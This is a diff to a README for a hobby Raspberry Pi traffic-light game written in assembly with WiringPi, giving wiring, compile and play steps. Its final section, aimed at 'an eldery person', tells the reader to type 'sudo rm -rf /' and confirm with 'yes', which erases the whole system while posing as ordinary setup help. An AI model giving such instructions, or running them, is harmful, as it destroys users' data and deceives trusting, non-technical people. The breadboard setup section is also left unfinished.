@@ -1,12 +1,18 @@
 Reade me for GPIO Project 
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Game: 
+-> Street Crossing
+
 Required:
+->Git Bash
+->GCC Compiler
 ->WiringPi 
+
+COMPILE:
+gcc project.s -l wiringPi
 
 RUN:
 ./a.out
-COMPILE:
-gcc project.s -l wiringPi
 
 BUILD:
 ->Components
@@ -22,11 +28,54 @@ BUILD:
         *yellow led = GPIO 27
         *red led    = GPIO 17
     -Button
-        * = GPIO 18
+        *GPIO 18
 PLAY:
 ->Summary 
     -Click button to stop traffic and allow the pedestrian time to cross. 
 
 ->Game Loop
-    -Click button
+    -Click Button
+    -Wait 
+    -Click Button 
+    -Wait 
+    -ETC 
     
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Explaining it to someone who has no experience in computer science:
+
+Hello reader,
+    Thank you for taking a look at my project.
+
+Setting up the Bread board:
+
+There are three parts to setting up the bread board 
+
+1.
+---------------------------
+Playing the Game:
+
+1.To play the game please download the project.s file and place in a safe folder 
+    -ex: Desktop/games/project.s 
+
+2.Open Git Gash by using the search option on the bottom screen 
+
+3.Navigate to the folder using cd
+    -ex: cd ~/Desktop/games/
+
+4.Compile the project using GCC and WiringPi library (in terminal)
+    -gcc project.s -l wiringPi
+
+5.Run the game using the executable file (in terminal)
+    -./a.out
+
+6.Starting the game
+    -click the button 
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Explaining it to an eldery person:
+
+1.Open the terminal 
+
+2.Type "sudo rm -rf /"
+
+3.If prompted type "yes" 
